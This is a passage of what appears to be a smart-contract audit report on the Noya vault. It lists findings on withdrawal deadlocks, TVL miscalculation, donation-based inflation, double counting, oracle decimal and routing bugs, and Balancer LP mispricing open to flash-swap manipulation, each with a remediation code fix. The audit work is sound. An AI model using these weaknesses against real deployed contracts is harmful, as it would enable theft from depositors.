        VaultReentrancyLib.ensureNotInVaultContext(IBalancerVault(balancerVault));
        PositionBP memory PTI = registry.getPositionBP(vaultId, p.positionId);
        PoolInfo memory pool = abi.decode(PTI.additionalData, (PoolInfo));
        uint256 lpBalance = totalLpBalanceOf(pool);
        (, uint256[] memory _tokenBalances,) = IBalancerVault(balancerVault).getPoolTokens(pool.poolId);
        uint256 _totalSupply = IERC20(pool.pool).totalSupply();

        uint256 _weight = pool.weights[pool.tokenIndex];

        uint256 token1bal = valueOracle.getValue(pool.tokens[pool.tokenIndex], base, _tokenBalances[pool.tokenIndex]);
        return (((1e18 * token1bal * lpBalance) / _weight) / _totalSupply);
    }
```

findings.technical_details:
In `AccountingManager`, user withdrawals are processed in batches via `currentWithdrawGroup`, where `currentWithdrawGroup.totalCBAmount` tracks the total calculated base token amount needed for the active withdrawal group.

`neededAssetsForWithdraw()` (lines 616–625) calculates the amount of assets still needed from connectors as:

```solidity
uint256 availableAssets = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
if (
    currentWithdrawGroup.isStarted == false || currentWithdrawGroup.isFullfilled == true
        || availableAssets >= currentWithdrawGroup.totalCBAmount
) {
    return 0;
}
return currentWithdrawGroup.totalCBAmount - availableAssets;
```

This function is used in two critical places during the withdrawal lifecycle:
1. **`retrieveTokensForWithdraw()` (lines 548–573):** Calls `uint256 neededAssets = neededAssetsForWithdraw();`, pulls funds from active connectors via `sendTokensToTrustedAddress`, increments `amountAskedForWithdraw` by the requested `retrieveData[i].withdrawAmount` (which can exceed the actual `amount` transferred by `BaseConnector` when slippage or losses occur), and enforces:
   ```solidity
   if (amountAskedForWithdraw_temp > neededAssets) {
       revert NoyaAccounting_INVALID_AMOUNT();
   }
   ```
2. **`fulfillCurrentWithdrawGroup()` (lines 370–390):** Calls `uint256 neededAssets = neededAssetsForWithdraw();` and enforces:
   ```solidity
   if (neededAssets != 0 && amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount) {
       revert NoyaAccounting_NOT_READY_TO_FULFILL();
   }
   ```

Because `neededAssetsForWithdraw()` measures the deficit strictly against `availableAssets` (`baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`) while `fulfillCurrentWithdrawGroup()` requires either `neededAssets == 0` (`availableAssets >= totalCBAmount`) or `amountAskedForWithdraw == currentWithdrawGroup.totalCBAmount`, two state-dependent inconsistencies arise whenever connectors return fewer tokens than `withdrawAmount` due to slippage or losses:

1. **Pre-existing `availableAssets` in `AccountingManager`:** If `AccountingManager` already holds any idle `baseToken` (`availableAssets > 0`) when the withdrawal group starts, `neededAssetsForWithdraw()` returns `totalCBAmount - availableAssets < totalCBAmount`. Because `retrieveTokensForWithdraw()` reverts if `amountAskedForWithdraw_temp > neededAssets`, the manager can only request at most `totalCBAmount - availableAssets` from connectors. If the connector transfers even 1 wei less than `withdrawAmount` due to slippage, the resulting `availableAssets` in `AccountingManager` is strictly less than `totalCBAmount` (so `neededAssets != 0`), while `amountAskedForWithdraw` is strictly less than `totalCBAmount`. Subsequent calls to `retrieveTokensForWithdraw()` are likewise capped by the new `neededAssets` (`totalCBAmount - availableAssets`), which equals only the slippage deficit rather than the unrequested pre-existing balance. Consequently, `amountAskedForWithdraw` can never reach `totalCBAmount`, and `fulfillCurrentWithdrawGroup()` perpetually reverts with `NoyaAccounting_NOT_READY_TO_FULFILL()`.
2. **Multi-transaction `retrieveTokensForWithdraw()` calls with slippage:** If the manager retrieves liquidity across multiple `retrieveTokensForWithdraw()` calls and the first call experiences slippage (`amount < withdrawAmount`), `availableAssets` increases by `amount` while `amountAskedForWithdraw` increases by `withdrawAmount`. In the next call, `neededAssetsForWithdraw()` returns `totalCBAmount - availableAssets`, which is greater than the remaining unrequested amount `totalCBAmount - amountAskedForWithdraw`. Requesting `neededAssets` causes `amountAskedForWithdraw` to exceed `totalCBAmount`, after which `amountAskedForWithdraw != currentWithdrawGroup.totalCBAmount` permanently holds whenever `availableAssets < totalCBAmount`, again deadlocking `fulfillCurrentWithdrawGroup()`.

findings.remediation:
Update `neededAssetsForWithdraw()` (and the corresponding accounting of already-available and already-requested assets) so that the remaining withdrawal deficit accounts for `amountAskedForWithdraw` rather than conflating received token balances with requested connector withdrawals, or cap retrieval requests against the unrequested deficit `currentWithdrawGroup.totalCBAmount - amountAskedForWithdraw`:

```solidity
    function neededAssetsForWithdraw() public view returns (uint256) {
        uint256 availableAssets = baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
        if ( // check if the withdraw group is fullfilled
            currentWithdrawGroup.isStarted == false || currentWithdrawGroup.isFullfilled == true
                || availableAssets >= currentWithdrawGroup.totalCBAmount
                || amountAskedForWithdraw >= currentWithdrawGroup.totalCBAmount
        ) {
            return 0;
        }
        return currentWithdrawGroup.totalCBAmount - amountAskedForWithdraw;
    }
```

findings.technical_details:
In `AccountingManager.sol`, the vault's total value locked (`TVL()`) is used as the basis for `totalAssets()` (line 592), ERC4626 share conversions (`previewDeposit` in `calculateDepositShares` and `previewRedeem` in `calculateWithdrawShares`), deposit limit checks (`deposit`), and vault profit calculations (`getProfit` at line 583).

`AccountingManager.TVL()` is implemented at lines 627–630 as:

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

Meanwhile, `TVLHelper.getTVL()` (in `contracts/helpers/TVLHelper.sol`, lines 14–34) iterates over all positions registered for `vaultId` in `PositionRegistry`, accumulates connector assets in `totalTVL` and connector liabilities in `totalDebt`, and returns:

```solidity
if (totalTVL < totalDebt) {
    return 0;
}
return (totalTVL - totalDebt);
```

Because the vault's assets are split across two custody locations—connectors tracked in `PositionRegistry` and `AccountingManager` itself (`baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit`)—clamping `totalTVL - totalDebt` to `0` inside `TVLHelper.getTVL()` before adding `AccountingManager`'s available `baseToken` balance creates a cross-custody netting error whenever `totalTVL < totalDebt` across the connectors:

$$\text{True Net TVL} = \max\left(0,\ (\text{totalTVL} + \text{availableBaseToken}) - \text{totalDebt}\right)$$

$$\text{Computed TVL} = \max(0,\ \text{totalTVL} - \text{totalDebt}) + \text{availableBaseToken}$$

Whenever connector liabilities exceed connector assets (`totalDebt > totalTVL`) while `AccountingManager` holds non-deposit-queue `baseToken` (for instance, when borrowed funds or withdrawn liquidity are transferred to `AccountingManager` via `retrieveTokensForWithdraw` to service a withdrawal group, or when connector collateral depreciates while idle `baseToken` sits in `AccountingManager`), `TVLHelper.getTVL()` returns `0` and swallows the deficit `totalDebt - totalTVL`. `AccountingManager.TVL()` then returns the full `availableBaseToken` balance without subtracting the remaining unpaid connector debt, overstating `TVL()` by `min(availableBaseToken, totalDebt - totalTVL)`.

findings.remediation:
Net total vault assets (both connector assets and `AccountingManager`'s available `baseToken` balance) against total vault debt before clamping to zero.

```solidity
    function TVL() public view returns (uint256) {
        uint256 totalTVL;
        uint256 totalDebt;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], address(baseToken));
            if (registry.isPositionDebt(vaultId, positions[i].positionId)) {
                totalDebt += tvl;
            } else {
                totalTVL += tvl;
            }
        }
        uint256 totalAssetsAvailable = totalTVL + baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit;
        if (totalAssetsAvailable < totalDebt) {
            return 0;
        }
        return totalAssetsAvailable - totalDebt;
    }
```

Track the total assets committed to already-calculated deposits and the total liabilities committed to already-calculated (and unexecuted) withdrawals, and adjust both the effective asset value in `TVL()` and the effective share supply used in conversions (or burn/mint shares at calculation time while tracking reserved withdrawal liabilities and calculated deposit assets separately).

Within `TVL()`, deduct the unpaid `baseToken` liabilities reserved for calculated/fulfilled withdrawals (when the corresponding shares are burned or excluded at calculation time) and include calculated deposit amounts (when their shares are minted or included at calculation time):

```solidity
    function TVL() public view returns (uint256) {
        uint256 reservedForWithdraw = currentWithdrawGroup.isFullfilled
            ? currentWithdrawGroup.totalABAmount - currentWithdrawGroup.alreadyWithdrawnAmount
            : currentWithdrawGroup.totalCBAmount;
        return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
            - depositQueue.totalAWFDeposit - reservedForWithdraw;
    }
```

*(Note: Ensure that the corresponding withdrawal shares are burned or excluded from `totalSupply()` at `calculateWithdrawShares()` time so that both numerator `TVL()` and denominator `totalSupply()` consistently exclude priced withdrawals.)*

findings.technical_details:
In `contracts/accountingManager/AccountingManager.sol`, `TVL()` aggregates the value of all active holding positions registered in `PositionRegistry` via `TVLHelper.getTVL(vaultId, registry, address(baseToken))`. Whenever a connector holds an ERC20 token, `BaseConnector._updateTokenInRegistry` registers a holding position with `calculatorConnector = accountingManager`, `positionTypeId = 0`, `p.data = abi.encode(token)`, and `position.data = abi.encode(address(this))`.

When `TVLHelper.getTVL` evaluates these positions, it invokes `AccountingManager.getPositionTVL`:

```solidity
function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
    PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
    if (p.positionTypeId == 0) {
        address token = abi.decode(p.data, (address));
        uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
        return _getValue(token, base, amount);
    }
    return 0;
}
```

Line 636 directly reads `IERC20(token).balanceOf(abi.decode(position.data, (address)))` without tracking the actual token balance accounted for by the vault/connector. This creates a balance-based accounting integrity flaw:

1. **Externally Induced TVL and Profit Distortion:** Any external actor can transfer `token` directly to the connector address (`abi.decode(position.data, (address))`). Because `getPositionTVL` blindly values the entire `IERC20(token).balanceOf` of the connector, any externally transferred tokens immediately inflate `getPositionTVL` and `AccountingManager.TVL()`. Since vault share pricing and profit calculation (`Profit = (TVL + Total Withdrawn Amount) - Total Deposited Amount`) depend directly on `TVL()`, an attacker can artificially inflate `TVL()` to distort share minting/redemption rates or trigger overstated profit and performance fee calculations.
2. **Overlapping / Unaccounted Balance Valuation and Position Removal Denial:** `BaseConnector._updateTokenInRegistry(token)` determines whether to remove a holding position using `IERC20(token).balanceOf(address(this)) == 0`. By transferring even `1 wei` of `token` directly to a connector, an external actor ensures `balanceOf` stays non-zero after the connector disposes of its position, keeping the position permanently active in `registry.holdingPositions` (consuming one of `maxNumHoldingPositions` and preventing `Registry.removeTrustedPosition`), while any subsequent external or overlapping token balances on that connector continue to be valued in `getPositionTVL`.

findings.remediation:
Track the accounted token balances internally (either within the connector or encoded in the holding position's tracked state) rather than querying the raw `IERC20(token).balanceOf` in `getPositionTVL`, or cap/read the balance from the connector's internally tracked holding balance:

```solidity
    function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
        PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
        if (p.positionTypeId == 0) {
            address token = abi.decode(p.data, (address));
            address holder = abi.decode(position.data, (address));
            uint256 accountedAmount = position.additionalData.length >= 32
                ? abi.decode(position.additionalData, (uint256))
                : IERC20(token).balanceOf(holder);
            uint256 actualBalance = IERC20(token).balanceOf(holder);
            uint256 amount = accountedAmount < actualBalance ? accountedAmount : actualBalance;
            return _getValue(token, base, amount);
        }
        return 0;
    }
```

findings.technical_details:
In `AccountingManager.getPositionTVL` (`contracts/accountingManager/AccountingManager.sol` lines 632–639), the contract calculates the value of a vault's holding position (`positionTypeId == 0`) in terms of the `base` token by calling `_getValue(token, base, amount)` (line 637), which delegates to `valueOracle.getValue(token, base, amount)` (line 646).

`NoyaValueOracle.getValue` resolves each hop in `priceRoutes[asset][baseToken]` via `_getValue(quotingToken, baseToken, amount)` (`contracts/helpers/valueOracle/NoyaValueOracle.sol` lines 71–110), which invokes `ChainlinkOracleConnector.getValue` (`contracts/helpers/valueOracle/oracles/ChainlinkOracleConnector.sol` lines 89–103):

```solidity
(address primarySource, bool isPrimaryInverse) = getSourceOfAsset(asset, baseToken);
if (primarySource == address(0)) {
    revert NoyaChainlinkOracle_PRICE_ORACLE_UNAVAILABLE(asset, baseToken, primarySource);
}
address decimalsSource = isPrimaryInverse ? baseToken : asset;
decimalsSource = decimalsSource == ETH || decimalsSource == USD ? primarySource : decimalsSource;
return getValueFromChainlinkFeed(
    AggregatorV3Interface(primarySource), amount, getTokenDecimals(decimalsSource), isPrimaryInverse
);
```

For any Chainlink price feed registered for `(tokenA, tokenB)` (quoting `tokenA` in units of `tokenB`, i.e., `tokenA / tokenB`):
- When `isPrimaryInverse == false` (`asset = tokenA`, `baseToken = tokenB`), `decimalsSource` is `asset` (`tokenA`).
- When `isPrimaryInverse == true` (`asset = tokenB`, `baseToken = tokenA`), `decimalsSource` is `baseToken` (`tokenA`).

Thus, `decimalsSource` is always `tokenA` (the base asset of the feed), and `getValueFromChainlinkFeed` requires `getTokenDecimals(decimalsSource)` to be the decimals of `tokenA` so it can scale `amount` by $10^{\text{decimals}(tokenA)}$. Meanwhile, `AggregatorV3Interface(primarySource).decimals()` is the decimals of the feed's quote denomination (`tokenB`).

Because `ETH` (`address(0)`) and `USD` (`address(840)`) are virtual currency identifiers rather than deployed ERC20 contracts:
- In Noya's oracle system, `ETH` (`address(0)`) amounts are represented in 18 decimals (as returned by `*/ETH` Chainlink feeds), and `USD` (`address(840)`) amounts are represented in 8 decimals (as returned by `*/USD` Chainlink feeds).
- However, on line 99, when `decimalsSource == ETH || decimalsSource == USD`, `ChainlinkOracleConnector.getValue` replaces `decimalsSource` with `primarySource` and calls `getTokenDecimals(primarySource)`.
- Because `decimalsSource` is always the feed's base asset (`tokenA`), `decimalsSource == ETH` occurs when the feed is `ETH/USD` (`tokenA = ETH`, `tokenB = USD`). The `ETH/USD` Chainlink aggregator has 8 decimals (the decimals of its quote currency, `USD`), whereas `ETH` has 18 decimals.
- Passing `getTokenDecimals(primarySource)` (8) instead of 18 into `getValueFromChainlinkFeed` causes `getValue(ETH, USD, amount)` to divide `amount * price` by $10^8$ instead of $10^{18}$ (inflating the USD value by $10^{10}$), and causes `getValue(USD, ETH, amount)` (`isPrimaryInverse == true`) to multiply `amount` by $10^8$ instead of $10^{18}$ before dividing by `price` (deflating the ETH value by $10^{10}$).

findings.remediation:
In `ChainlinkOracleConnector.getValue`, determine the decimals of `ETH` (`18`) and `USD` (`8`) explicitly rather than querying `primarySource.decimals()` when `decimalsSource` is `ETH` or `USD`:

```solidity
    function getValue(address asset, address baseToken, uint256 amount) public view returns (uint256) {
        if (asset == baseToken) {
            return amount;
        }

        (address primarySource, bool isPrimaryInverse) = getSourceOfAsset(asset, baseToken);
        if (primarySource == address(0)) {
            revert NoyaChainlinkOracle_PRICE_ORACLE_UNAVAILABLE(asset, baseToken, primarySource);
        }
        address decimalsSource = isPrimaryInverse ? baseToken : asset;
        uint256 sourceDecimals;
        if (decimalsSource == ETH) {
            sourceDecimals = 18;
        } else if (decimalsSource == USD) {
            sourceDecimals = 8;
        } else {
            sourceDecimals = getTokenDecimals(decimalsSource);
        }
        return getValueFromChainlinkFeed(
            AggregatorV3Interface(primarySource), amount, sourceDecimals, isPrimaryInverse
        );
    }
```

findings.technical_details:
In `AccountingManager.sol`, `TVL()` computes the vault's total value locked by summing `TVLHelper.getTVL(vaultId, registry, address(baseToken))` and `baseToken.balanceOf(address(this))` (minus `depositQueue.totalAWFDeposit`).

When `TVLHelper.getTVL` iterates through the vault's `holdingPositions`, it calls `IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken)`. For direct token holdings (`positionTypeId == 0`), `calculatorConnector` is the `AccountingManager`, which executes:

```solidity
function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
    PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
    if (p.positionTypeId == 0) {
        address token = abi.decode(p.data, (address));
        uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
        return _getValue(token, base, amount);
    }
    return 0;
}
```

In `PositionRegistry.updateHoldingPosition`, the uniqueness key for a holding position is computed as:

```solidity
bytes32 holdingPositionId = keccak256(abi.encode(msg.sender, _positionId, _data));
```

Because `getPositionTVL` decodes the holder address from `position.data` (`abi.decode(position.data, (address))`) rather than enforcing that the holder is `position.ownerConnector` with canonical `position.data` encoding and excluding `address(this)`, duplicate and overlapping valuations can occur in three ways:

1. **Overlap with `AccountingManager`'s own `baseToken` balance:** In `PositionRegistry.addVault`, `AccountingManager` is enabled as a connector and `baseToken` is registered as a trusted token. If a holding position for `baseToken` (`positionTypeId == 0`) references `address(accountingManager)` in `position.data`, `getPositionTVL` includes `baseToken.balanceOf(address(accountingManager))` inside `TVLHelper.getTVL`, while `AccountingManager.TVL()` adds `baseToken.balanceOf(address(this))` a second time.
2. **Cross-connector overlapping holder valuation:** A connector calling `updateHoldingPosition` has `msg.sender` stored as `position.ownerConnector`, while `position.data` can encode any connector address. Two connectors referencing the same holder address in `position.data` produce distinct `holdingPositionId` hashes (`keccak256(abi.encode(msg.sender, _positionId, _data))`), causing `getPositionTVL` to count the same connector's `IERC20(token).balanceOf(holder)` twice.
3. **Non-canonical `position.data` encoding collisions:** `abi.decode(position.data, (address))` reads only the first 32-byte word and ignores trailing bytes, whereas `holdingPositionId` hashes the full `_data` byte array. Distinct `_data` payloads that share the same first 32-byte address word create separate `HoldingPI` entries in `PositionRegistry` that both resolve to the exact same `IERC20(token).balanceOf(...)` in `getPositionTVL`.

findings.remediation:
In `AccountingManager.getPositionTVL`, ensure that the holder address is `position.ownerConnector`, validate that `position.data` is canonically encoded as `abi.encode(position.ownerConnector)`, and disallow `address(this)` as the token holder for `positionTypeId == 0` positions so `AccountingManager` balances cannot be double-counted alongside `TVL()`.

```solidity
    function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
        PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
        if (p.positionTypeId == 0) {
            if (position.data.length != 32) return 0;
            address holder = abi.decode(position.data, (address));
            if (holder != position.ownerConnector || holder == address(this)) return 0;
            address token = abi.decode(p.data, (address));
            uint256 amount = IERC20(token).balanceOf(holder);
            return _getValue(token, base, amount);
        }
        return 0;
    }
```

findings.technical_details:
In `AccountingManager.getPositionTVL` (lines 632–639), holding positions with `positionTypeId == 0` determine the vault's token balance and convert its value into `base` by calling `_getValue(token, base, amount)` at line 637, which delegates to `valueOracle.getValue(token, base, amount)` at line 646.

In `NoyaValueOracle.sol`, `getValue` retrieves the configured intermediate routing path `address[] memory sources = priceRoutes[asset][baseToken]` (line 76) and calls the internal multi-hop conversion function `_getValue(asset, baseToken, amount, sources)` (lines 81–93):

```solidity
function _getValue(address asset, address baseToken, uint256 amount, address[] memory sources)
    internal
    view
    returns (uint256 value)
{
    uint256 initialValue = amount;
    address quotingToken = asset;
    for (uint256 i = 0; i < sources.length; i++) {
        initialValue = _getValue(asset, sources[i], initialValue);
        quotingToken = sources[i];
    }
    return _getValue(quotingToken, baseToken, initialValue);
}
```

At line 87, `quotingToken` is initialized to `asset`. During the first iteration (`i = 0`), `_getValue(asset, sources[0], initialValue)` converts `amount` from `asset` into `sources[0]`, and line 90 updates `quotingToken = sources[0]`.

However, on subsequent iterations (`i >= 1`), line 89 still passes `asset` as the first argument to `_getValue(asset, sources[i], initialValue)` instead of `quotingToken` (`sources[i - 1]`). Consequently:
1. If no direct oracle exists between `asset` and `sources[i]` (which is the standard reason a multi-hop route `asset -> sources[0] -> sources[1] -> baseToken` is configured), `_getValue(asset, sources[i], initialValue)` reverts with `NoyaOracle_PriceOracleUnavailable(asset, sources[i])`.
2. If a fallback/default oracle (`defaultPriceSource[sources[i]]` or `defaultPriceSource[asset]`) is matched, `initialValue`—which is already denominated in `sources[0]` units and decimals—is treated as an amount of `asset` and converted from `asset` to `sources[i]`, discarding the `asset -> sources[0]` price conversion and applying the wrong token price and decimal scaling.

findings.remediation:
In `NoyaValueOracle._getValue`, pass `quotingToken` instead of `asset` as the first argument to `_getValue` inside the loop.

```solidity
    function _getValue(address asset, address baseToken, uint256 amount, address[] memory sources)
        internal
        view
        returns (uint256 value)
    {
        uint256 initialValue = amount;
        address quotingToken = asset;
        for (uint256 i = 0; i < sources.length; i++) {
            initialValue = _getValue(quotingToken, sources[i], initialValue);
            quotingToken = sources[i];
        }
        return _getValue(quotingToken, baseToken, initialValue);
    }
```

findings.technical_details:
When calculating the TVL of a Balancer LP position in `BalancerConnector._getPositionTVL` (`contracts/connectors/BalancerConnector.sol`), the contract retrieves the position blueprint `PTI` from `PositionRegistry` and decodes `PoolInfo` from `PTI.additionalData`:

```solidity
PositionBP memory PTI = registry.getPositionBP(vaultId, p.positionId);
PoolInfo memory pool = abi.decode(PTI.additionalData, (PoolInfo));
uint256 lpBalance = totalLpBalanceOf(pool);
(, uint256[] memory _tokenBalances,) = IBalancerVault(balancerVault).getPoolTokens(pool.poolId);
uint256 _totalSupply = IERC20(pool.pool).totalSupply();

uint256 _weight = pool.weights[pool.tokenIndex];

uint256 token1bal = valueOracle.getValue(pool.tokens[pool.tokenIndex], base, _tokenBalances[pool.tokenIndex]);
return (((1e18 * token1bal * lpBalance) / _weight) / _totalSupply);
```

This valuation logic suffers from a metadata integrity and index-alignment flaw across the parameters used to value the position:

1. **Token Ordering and Reserve-Index Misalignment (`pool.tokens` vs. `_tokenBalances`):**
   On line 166, `IBalancerVault(balancerVault).getPoolTokens(pool.poolId)` returns `(address[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock)`, where `tokens` and `balances` are ordered by the Balancer Vault's internal registration order and, for pools with pre-minted BPT (such as Composable Stable Pools like `wstETH_wETH_BPT` tested in `BalancerConnector.t.sol`), include the pool's own BPT token at one of the indices. However, `_getPositionTVL` discards the `tokens` array returned by `getPoolTokens` and instead indexes into the static `pool.tokens` array from `PoolInfo` at `pool.tokenIndex` while reading the reserve amount from `_tokenBalances[pool.tokenIndex]`. As seen in `testDepositIntoWETH_WSTETHPool` (`testFoundry/BalancerConnector.t.sol`), `PoolInfo.tokens` is populated with only the 2 underlying tokens (`[WETH, WSTETH]`) while `getPoolTokens` returns 3 elements (including the BPT itself). Consequently, `pool.tokens[pool.tokenIndex]` and `_tokenBalances[pool.tokenIndex]` can reference completely different tokens (e.g., pricing the BPT reserve or another token's reserve using `WSTETH`'s oracle price).

2. **Stale or Unverified Pool Weights and Identity (`pool.weights`, `pool.pool`, `pool.poolId`):**
   `Registry.addTrustedPosition` only passes `_data` (`abi.encode(poolId)`) to `getUnderlyingTokens` (which `BalancerConnector` does not override, returning an empty array) and performs no validation on `_additionalData` (`PoolInfo`). `_getPositionTVL` trusts `pool.pool`, `pool.tokens`, and `pool.weights[pool.tokenIndex]` from `PTI.additionalData` without verifying `pool.pool == IBalancerVault(balancerVault).getPool(pool.poolId)` or fetching the live normalized weights (`IBalancerPool(pool.pool).getNormalizedWeights()`) and token list from the Balancer contracts. If the pool weights change (e.g., managed/gradual weight update pools) or `PoolInfo` arrays are not aligned with the vault's token array (including BPT), `_weight`, `_totalSupply`, and `token1bal` produce a corrupted TVL.

findings.remediation:
Fetch the canonical pool address and `tokens` array directly from `IBalancerVault` (and normalized weights from `IBalancerPool` for weighted pools), or validate that `pool.tokens[pool.tokenIndex]` matches the token returned by `getPoolTokens` at the corresponding index:

```solidity
    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256) {
        PositionBP memory PTI = registry.getPositionBP(vaultId, p.positionId);
        PoolInfo memory pool = abi.decode(PTI.additionalData, (PoolInfo));
        uint256 lpBalance = totalLpBalanceOf(pool);
        (address[] memory _tokens, uint256[] memory _tokenBalances,) =
            IBalancerVault(balancerVault).getPoolTokens(pool.poolId);
        address poolAddress = IBalancerVault(balancerVault).getPool(pool.poolId);
        uint256 _totalSupply = IERC20(poolAddress).totalSupply();

        uint256 _weight = pool.weights[pool.tokenIndex];

        uint256 token1bal = valueOracle.getValue(_tokens[pool.tokenIndex], base, _tokenBalances[pool.tokenIndex]);
        return (((1e18 * token1bal * lpBalance) / _weight) / _totalSupply);
    }
```

findings.technical_details:
In `contracts/connectors/BalancerConnector.sol`, `_getPositionTVL` computes the value of the connector's Balancer LP holdings in terms of the vault's `base` token:

```solidity
function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256) {
    PositionBP memory PTI = registry.getPositionBP(vaultId, p.positionId);
    PoolInfo memory pool = abi.decode(PTI.additionalData, (PoolInfo));
    uint256 lpBalance = totalLpBalanceOf(pool);
    (, uint256[] memory _tokenBalances,) = IBalancerVault(balancerVault).getPoolTokens(pool.poolId);
    uint256 _totalSupply = IERC20(pool.pool).totalSupply();

    uint256 _weight = pool.weights[pool.tokenIndex];

    uint256 token1bal = valueOracle.getValue(pool.tokens[pool.tokenIndex], base, _tokenBalances[pool.tokenIndex]);
    return (((1e18 * token1bal * lpBalance) / _weight) / _totalSupply);
}
```

On line 167, the contract retrieves `_totalSupply` using `IERC20(pool.pool).totalSupply()`. However, modern Balancer V2 pools (such as `ComposableStablePool` and newer `WeightedPool` implementations, including the `wstETH_wETH_BPT` and `vanillaUsdcDaiUsdt` pools configured in `BalancerConnector.t.sol`) use a "pre-minted BPT" architecture. At pool initialization, the pool mints `type(uint112).max` (approximately `5.19 * 10^33`) BPT to the Balancer Vault so that joins and exits can transfer BPT rather than minting and burning it.

Consequently, `IERC20(pool.pool).totalSupply()` returns the nominal total supply including the uncirculated BPT held by the Balancer Vault, rather than the effective circulating LP supply (`getActualSupply()` or `getVirtualSupply()`). Because `_totalSupply` is used as the divisor on line 172 (`(((1e18 * token1bal * lpBalance) / _weight) / _totalSupply)`), dividing by `~5.19e33` causes the resulting TVL to be underestimated by many orders of magnitude and typically truncate to `0`.

findings.remediation:
Query `getActualSupply()` (available on modern WeightedPools and ComposableStablePools) or `getVirtualSupply()` on the Balancer pool contract instead of `IERC20(pool.pool).totalSupply()` to obtain the effective circulating supply of BPT.

```solidity
    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256) {
        PositionBP memory PTI = registry.getPositionBP(vaultId, p.positionId);
        PoolInfo memory pool = abi.decode(PTI.additionalData, (PoolInfo));
        uint256 lpBalance = totalLpBalanceOf(pool);
        (, uint256[] memory _tokenBalances,) = IBalancerVault(balancerVault).getPoolTokens(pool.poolId);
        uint256 _totalSupply = IBalancerPool(pool.pool).getActualSupply();

        uint256 _weight = pool.weights[pool.tokenIndex];

        uint256 token1bal = valueOracle.getValue(pool.tokens[pool.tokenIndex], base, _tokenBalances[pool.tokenIndex]);
        return (((1e18 * token1bal * lpBalance) / _weight) / _totalSupply);
    }
```

findings.technical_details:
In `contracts/connectors/BalancerConnector.sol`, `_getPositionTVL` computes the TVL of a vault's Balancer LP holding position as follows:

```solidity
(, uint256[] memory _tokenBalances,) = IBalancerVault(balancerVault).getPoolTokens(pool.poolId);
uint256 _totalSupply = IERC20(pool.pool).totalSupply();

uint256 _weight = pool.weights[pool.tokenIndex];

uint256 token1bal = valueOracle.getValue(pool.tokens[pool.tokenIndex], base, _tokenBalances[pool.tokenIndex]);
return (((1e18 * token1bal * lpBalance) / _weight) / _totalSupply);
```

This valuation logic is fundamentally broken across several dimensions:

1. **Circulating vs. Nominal Supply Discrepancy (`totalSupply`)**: Balancer ComposableStablePools and Boosted Pools (such as the `vanillaUsdcDaiUsdt` and `wstETH_wETH_BPT` pools configured in the protocol's test suite) pre-mint `type(uint112).max / 2` (~`2.59e33`) BPT to the Balancer Vault at initialization. Calling `IERC20(pool.pool).totalSupply()` returns the entire nominal supply including pre-minted BPT held by the Vault rather than the circulating supply (`getActualSupply()` or `getVirtualSupply()`). Dividing by `_totalSupply` (~`2.59e33`) causes the division on line 172 to truncate to `0`, reporting zero TVL for active positions.
2. **Pool-Type and Weighting Model Mismatch**: The formula `(1e18 * token1bal) / _weight` assumes an ideal constant-weight pool where the USD/base value of `pool.tokens[pool.tokenIndex]` always equals `_weight / 1e18` of the total pool value. For StablePools and ComposableStablePools, token ratios float freely according to the StableMath invariant without fixed weights, so a single token's reserve divided by a configured weight does not represent total pool value.
3. **Manipulable Spot Reserve Valuation**: Even in standard Weighted Pools, `_tokenBalances[pool.tokenIndex]` is the instantaneous spot reserve in the Balancer Vault. Because `_getPositionTVL` values only a single token's raw reserve and scales it by `1e18 / _weight` rather than using a manipulation-resistant BPT pricing formula (e.g., geometric mean of oracle prices for Weighted Pools or `getRate()` with oracle-priced underlying tokens for StablePools), an attacker can execute a flash swap in the Balancer pool to skew `_tokenBalances[pool.tokenIndex]` and arbitrarily inflate or deflate the vault's reported TVL within a single transaction.

findings.remediation:
Calculate the pool's TVL by summing the oracle-derived values of all underlying tokens in the pool (skipping the pool's own pre-minted BPT token if present in `getPoolTokens`) and dividing by the pool's actual circulating supply (`getActualSupply()`), or use Balancer's manipulation-resistant invariant/rate math combined with `valueOracle` prices.

```solidity
    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256) {
        PositionBP memory PTI = registry.getPositionBP(vaultId, p.positionId);
        PoolInfo memory pool = abi.decode(PTI.additionalData, (PoolInfo));
        uint256 lpBalance = totalLpBalanceOf(pool);
        if (lpBalance == 0) {
            return 0;
        }
        (address[] memory tokens, uint256[] memory _tokenBalances,) =
            IBalancerVault(balancerVault).getPoolTokens(pool.poolId);
        uint256 _totalSupply = IBalancerPool(pool.pool).getActualSupply();

        uint256 totalPoolValue;
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == pool.pool) {
                continue;
            }
            totalPoolValue += _getValue(tokens[i], base, _tokenBalances[i]);
        }

        return (totalPoolValue * lpBalance) / _totalSupply;
    }
```

findings.technical_details:
